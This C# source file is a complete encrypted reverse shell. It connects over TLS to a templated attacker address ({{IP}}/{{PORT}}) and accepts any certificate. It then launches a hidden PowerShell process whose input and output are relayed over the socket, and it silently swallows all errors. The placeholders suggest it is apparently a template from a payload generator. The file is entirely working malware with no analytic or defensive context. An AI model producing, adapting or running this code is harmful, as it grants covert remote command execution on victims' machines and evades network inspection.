
using System;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Authentication;     // ← for SslProtocols
using System.Security.Cryptography.X509Certificates;
using System.Diagnostics;
using System.IO;
using System.Threading;

class Program
{
	const string RemoteHost = "{{IP}}";
	const int    RemotePort = {{PORT}};

	static void Main()
	{
		try
		{
			
			using (var client = new TcpClient(RemoteHost, RemotePort))
			
			using (var ssl = new SslStream(
				client.GetStream(),
				leaveInnerStreamOpen: false,
				userCertificateValidationCallback: (_,__,___,____) => true
			))
			{
				
				ssl.AuthenticateAsClient(
					targetHost: RemoteHost,
					clientCertificates: null,
					enabledSslProtocols: SslProtocols.Tls12,
					checkCertificateRevocation: false
				);

				var p = new Process
				{
					StartInfo = new ProcessStartInfo
					{
						FileName               = "powershell.exe",
						RedirectStandardInput  = true,
						RedirectStandardOutput = true,
						RedirectStandardError  = true,
						UseShellExecute        = false,
						CreateNoWindow         = true
					}
				};
				p.Start();

				
				var tOut = new Thread(() => CopyStream(p.StandardOutput.BaseStream, ssl)) { IsBackground = true };
				var tErr = new Thread(() => CopyStream(p.StandardError .BaseStream, ssl)) { IsBackground = true };
				var tIn  = new Thread(() => CopyStream(ssl,               p.StandardInput.BaseStream)) { IsBackground = true };

				tOut.Start();
				tErr.Start();
				tIn .Start();

				p.WaitForExit();
			}
		}
		catch
		{
			// swallow all errors
		}
	}

	static void CopyStream(Stream input, Stream output)
	{
		var buf = new byte[4096];
		int  len;
		try
		{
			while ((len = input.Read(buf, 0, buf.Length)) > 0)
			{
				output.Write(buf, 0, len);
				output.Flush();
			}
		}
		catch { }
	}
}
